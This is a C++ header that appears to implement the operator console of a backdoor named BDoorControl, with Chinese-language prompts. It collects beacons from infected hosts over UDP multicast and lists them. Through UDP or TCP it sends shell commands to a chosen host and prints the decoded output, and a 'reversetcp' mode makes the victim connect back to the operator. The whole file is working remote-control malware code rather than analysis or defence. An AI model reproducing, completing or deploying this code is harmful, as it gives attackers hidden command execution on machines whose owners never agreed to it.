#pragma once
#include <protocol\BDoorProtocol.h>
#include <other\tools.h>
struct CommandReValue {
	int revalue = NULL;
	vector<string> command = vector<string>();
	/*CommandReValue operator=(const CommandReValue& crv1) {
		revalue = crv1.revalue;
		command = crv1.command;
		return *this;
	}*/
};

class Command {
private:
	const string name;
public:
	virtual CommandReValue Func(string command,string& returnmess) = 0;
	string GetName() const{ return name; }
};
class SearchHost:public Command{
private:
	const string name = "主机列表";
	list<sockaddr_in> host_list;
public:
	SearchHost() {
		thread([this]() {
			SOCKET group_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
			sockaddr_in group_addr;
			group_addr.sin_family = AF_INET;
			group_addr.sin_addr.s_addr = htonl(INADDR_ANY);
			group_addr.sin_port = htons(GROUP_PORT);
			bindport(group_socket, (const sockaddr*)&group_addr, sizeof(group_addr));
			ip_mreq mreq;
			mreq.imr_multiaddr.s_addr = inet_addr(GROUP_IP);
			mreq.imr_interface.s_addr = INADDR_ANY;
			setsockopt(group_socket, IPPROTO_IP, IP_ADD_MEMBERSHIP, (char*)&mreq, sizeof(mreq));
			int Result;
			sockaddr_in sender_addr;
			int sender_addr_size = sizeof(sender_addr);
			while (true) {
				char buf[1024];
				Result = recvfrom(group_socket, buf, sizeof(buf), 0, (sockaddr*)&sender_addr, &sender_addr_size);
				if (Result == SOCKET_ERROR) {
					wprintf(L"recvfrom failed with error %d\n", WSAGetLastError());
				}
				else {
					host_list.push_back(sender_addr);
					host_list.unique();

				}
			}
			}).detach();
	}
	CommandReValue Func(string command, string& returnmess) {
		CommandReValue crv;
		if (command == "查看主机列表"|| command == "host") {
			returnmess += "主机列表：\n\n";
			for (auto e : host_list) {
				returnmess += string(inet_ntoa(e.sin_addr))+"\n";
			}
			crv.revalue = END;
			return crv;
		}
		else if (command == "清空主机列表"|| command == "clear") {
			host_list.clear();
			crv.revalue = END;
			return crv;
		}
		else {
			crv.revalue = NOTCOM;
			return crv;
		}
	}
	list<sockaddr_in>& GetHostList() { return host_list; }
};
class UDP:public Command{
private:
	class Cmd :public Command {
	private:
		const string name = "cmd";
		SOCKET &udp_socket;
		sockaddr_in &udp_addr;
		int step = 0;
	public:
		Cmd(SOCKET& udp_socket_a, sockaddr_in& udp_addr_a) :udp_socket(udp_socket_a), udp_addr(udp_addr_a) {

		}
		CommandReValue Func(string command, string& returnmess) {
			CommandReValue crv;
			if (step == 0) {
				if (command == name) {
					cout << "cmd模式" << endl;
					step++;
					crv.revalue = ENTRANCE;
					return crv;
				}else {
					crv.revalue = NOTCOM;
					return crv;
				}
			}
			else if (step == 1) {
				if (command == "返回") {
					crv.revalue = END;
					return crv;
				}
				string recvmess;
				if (udp::SendtoMess(udp_socket, udp_addr, FormatJson(name,command).dump()) == 0) {
					returnmess = "发送错误";
					crv.revalue = ERROR;
					return crv;
				}
				cout << "发送" << endl;
				if (udp::RecvfromMess(udp_socket, udp_addr, recvmess) == 0) {
					returnmess = "接收错误";
					crv.revalue = ERROR;
					return crv;
				}
				
				returnmess = DecodeStrInBase64(json::parse(recvmess)[CONTENT]);
				crv.revalue = ENTRANCE;
				return crv;
			}
		}
	};
	const string name = "udp";
	SOCKET udp_socket;
	sockaddr_in udp_addr;
	int step = 0;
	Command* entrance = nullptr;
	Cmd cmd = Cmd(udp_socket,udp_addr);
	
public:
	vector<Command*> command_list = { &cmd };
	UDP() {
		udp_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		sockaddr_in addr;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(UDP_PORT);
		addr.sin_addr.s_addr = htonl(INADDR_ANY);
		bindport(udp_socket, (const sockaddr*)&addr, sizeof(addr));
		udp_addr.sin_family = AF_INET;
		udp_addr.sin_port = htons(UDP_PORT);
	}
	CommandReValue Func(string command, string& returnmess) override {
		CommandReValue crv;
		if (step == 0) {
			vector<string> command_split;
			split_string(command, " ", command_split);
			if (command_split[0] == name) {
				if (command_split.size() < 2) {
					returnmess = "IP地址不能为空";
					crv.revalue = ERROR;
					return crv;
				}
				if (check_ip(command_split[1])) {
					udp_addr.sin_addr.s_addr = inet_addr(command_split[1].data());
					cout << "udp模式 连接：" << inet_ntoa(udp_addr.sin_addr) << endl;
					crv.revalue = ENTRANCE;
					step++;
					return crv;
				}
				else {
					returnmess = "IP地址不正确";
					crv.revalue = ERROR;
					return crv;
				}
			}
			else {
				crv.revalue = NOTCOM;
				return crv;
			}
		}
		else if (step == 1) {
			if (command == "返回" && entrance == nullptr) {
				step = 0;
				crv.revalue = END;
				return crv;
			}
			CommandReValue Result;
			bool is_com = false;
			for (int i = 0; i < command_list.size(); i++) {
				bool is_entrance = false;
				if (entrance != nullptr) {
					Result = entrance->Func(command, returnmess);
					is_entrance = true;
				}
				else {
					Result = command_list[i]->Func(command, returnmess);
				}
				if (Result.revalue != NOTCOM) {
					is_com = true;
				}
				switch (Result.revalue)
				{
				case 1:
					entrance = nullptr;
					crv.revalue = ENTRANCE;
					return crv;
				case 2:
					entrance = command_list[i];
					crv.revalue = ENTRANCE;
					return crv;
				case 3:
					for (int j = 0; j < Result.command.size(); j++) {
						Func(Result.command[j], returnmess);
					}
					crv.revalue = ENTRANCE;
					return crv;
				case -1:
					entrance = nullptr;
					crv.revalue = ENTRANCE;
					return crv;
				default:
					break;
				}
				if (is_entrance) { break; }
			}
			if (!is_com) {
				returnmess = "'" + command + "'" + "udp:不是任何指令";
				crv.revalue = ENTRANCE;
				return crv;
			}
		}
	}
	SOCKET& GetUdpSocket() { return udp_socket; }
};
class TCP: public Command {
private:
	class Cmd :public Command {
	private:
		const string name = "cmd";
		SOCKET &connect_socket;
		int step = 0;

	public:
		Cmd(SOCKET &connect_socket_a):connect_socket(connect_socket_a) {

		}
		CommandReValue Func(string command, string& returnmess) {
			CommandReValue crv;
			if (step == 0) {
				if (command == name) {
					tcp::SendBase64(connect_socket, FormatJson("null", "null").dump());
					step++;
					crv.revalue = ENTRANCE;
					return crv;
				}
				else {
					crv.revalue = NOTCOM;
					return crv;
				}
			}
			else if (step == 1) {
				if (command == "返回") {
					step = 0;
					crv.revalue = END;
					return crv;
				}
				string recvmess;
				tcp::SendBase64(connect_socket, FormatJson(name, command).dump());
				tcp::RecvBase64(connect_socket, recvmess);
				returnmess = DecodeStrInBase64(json::parse(recvmess)[CONTENT]);
				crv.revalue = ENTRANCE;
				return crv;
			}
			
			
		}
	};
	const string name = "tcp";
	SOCKET listen_socket, connect_socket;
	sockaddr_in connect_addr,listen_addr;
	string	connect_ip;
	int step = 0;
	Cmd cmd = Cmd(connect_socket);
	vector<Command*> command_list = { &cmd };


	int CreateListenSocket() {
		listen_socket = socket(AF_INET,SOCK_STREAM, IPPROTO_TCP);
		memset(&listen_addr,0,sizeof(listen_addr));
		listen_addr.sin_family = AF_INET;
		listen_addr.sin_port = htons(TCP_PORT);
		listen_addr.sin_addr.s_addr = htonl(INADDR_ANY);
		bindport(listen_socket, (const sockaddr *)&listen_addr, sizeof(listen_addr));
	}
	int ListenConnect() {
		listen(listen_socket, 5);
		int connect_addr_len = sizeof(connect_addr);
		connect_socket = accept(listen_socket, (sockaddr*)&connect_addr,&connect_addr_len);
		return 1;
	}
	int Connect(string ip) {
		connect_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		memset(&connect_addr, 0, sizeof(connect_addr));
		connect_addr.sin_family = AF_INET;
		connect_addr.sin_addr.s_addr = inet_addr(ip.data());
		connect_addr.sin_port = htons(TCP_PORT);
		connect(connect_socket, (const sockaddr*)&connect_addr, sizeof(connect_addr));
		return 1;
	}
public:
	Command* entrance = nullptr;
	CommandReValue Func(string command,string &returnmess) override {
		CommandReValue crv;
		if (step == 0) {
			vector <string>command_split;
			split_string(command, " ", command_split);
			if (command_split[0] == "reversetcp" || command_split[0] == name) {
				if (command_split.size() < 2) {
					returnmess = "IP地址不能为空";
					crv.revalue = ERROR;
					return crv;
				}
				if (check_ip(command_split[1])) {
					connect_ip = command_split[1];
					if (command_split[0] == "reversetcp") {
						step = 10;
					}
					else if (command_split[0] == name) {
						step++;
					}
					crv.revalue = ENTRANCE;
					return crv;
				}
				else {
					returnmess = "IP地址格式不正确";
					crv.revalue = ERROR;
					return crv;
				}
			}
			else {
				crv.revalue = NOTCOM;
				return crv;
			}
		}
		else if (step == 1) {
			if (command == "返回") {
				step = 0;
				crv.revalue = END;
				return crv;
			}
			Connect(connect_ip);
			CommandReValue Result;
			bool is_com = false;
			for (int i = 0; i < command_list.size(); i++) {
				bool is_entrance = false;
				if (entrance != nullptr) {
					Result = entrance->Func(command, returnmess);
					is_entrance = true;
				}
				else {
					Result = command_list[i]->Func(command, returnmess);
				}
				if (Result.revalue != 0) {
					is_com = true;
				}
				switch (Result.revalue)
				{
				case 1:
					entrance = nullptr;
					crv.revalue = ENTRANCE;
					return crv;
				case 2:
					entrance = command_list[i];
					crv.revalue = ENTRANCE;
					return crv;
				case 3:
					for (int j = 0; j < Result.command.size(); j++) {
						Func(Result.command[j], returnmess);
					}
					crv.revalue = ENTRANCE;
					return crv;
				case -1:
					entrance = nullptr;
					crv.revalue = ENTRANCE;
					return crv;
				default:
					break;
				}
				if (is_entrance) { break; }
			}
			shutdown(connect_socket, SD_BOTH);
			if (connect_socket != INVALID_SOCKET)
			{
				closesocket(connect_socket);
			}
			if (!is_com) {
				returnmess = "'" + command + "'" + "不是任何指令";
				crv.revalue = NOTCOM;
				return crv;
			}
		}
		else if (step == 2) {

		}
		
		if (step == 10) {
			if (command == "返回") {
				step = 0;
				crv.revalue = END;
				return crv;
			}
			SOCKET reverse_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
			sockaddr_in addr = CreateSockAddrIn(REVERSE_PORT);
			bindport(reverse_socket, (const sockaddr*)&addr, sizeof(addr));
			sockaddr_in target_addr = CreateSockAddrIn(connect_ip, REVERSE_PORT);
			udp::SendtoMess(reverse_socket, target_addr, FormatJson(name, "reverse connect"));
			ListenConnect();
			CommandReValue Result;
			bool is_com = false;
			for (int i = 0; i < command_list.size(); i++) {
				bool is_entrance = false;
				if (entrance != nullptr) {
					Result = entrance->Func(command, returnmess);
					is_entrance = true;
				}
				else {
					Result = command_list[i]->Func(command, returnmess);
				}
				if (Result.revalue != 0) {
					is_com = true;
				}
				switch (Result.revalue)
				{
				case 1:
					entrance = nullptr;
					crv.revalue = ENTRANCE;
					return crv;
				case 2:
					entrance = command_list[i];
					crv.revalue = ENTRANCE;
					return crv;
				case 3:
					for (int j = 0; j < Result.command.size(); j++) {
						Func(Result.command[j], returnmess);
					}
					crv.revalue = ENTRANCE;
					return crv;
				case -1:
					entrance = nullptr;
					crv.revalue = ENTRANCE;
					return crv;
				default:
					break;
				}
				if (is_entrance) { break; }
			}
			if (!is_com) {
				returnmess = "'" + command + "'" + "不是任何指令";
				crv.revalue = NOTCOM;
				return crv;
			}
		}
	}
};
class BDoorControl {
private:
	int wsa = WSAInit();
	SearchHost search_host = SearchHost();
	UDP udp = UDP();
	TCP tcp = TCP();
	vector<Command*> command_list = {&search_host,&udp,&tcp};
	
public:
	Command *entrance = nullptr;
	int EnterCommand(string command, string& returnmess) {
		CommandReValue Result;
		bool is_com = false;
		if (command.empty()) {
			returnmess = "";
			return 0;
		}
		for (int i = 0; i < command_list.size(); i++) {
			bool is_entrance = false;
			if (entrance != nullptr) {
				Result = entrance->Func(command, returnmess);
				is_entrance = true;
			}
			else {
				Result = command_list[i]->Func(command, returnmess);
			}
			if (Result.revalue != 0) {
				is_com = true;
			}
			switch (Result.revalue)
			{
			case 1:
				entrance = nullptr;
				return 1;
			case 2:
				if (!is_entrance) {
					entrance = command_list[i];
				}
				return 1;
			case 3:
				for (int j = 0; j < Result.command.size(); j++) {
					EnterCommand(Result.command[j], returnmess);
				}
				return 1;
			case -1:
				entrance = nullptr;
				return -1;
			default:
				break;
			}
			if(is_entrance){break;}
		}
		if (!is_com) {
			returnmess = "'" + command + "'" + "entercommand:不是任何指令";
			return 0;
		}
	}
	~BDoorControl() {
		WSACleanup();
	}
};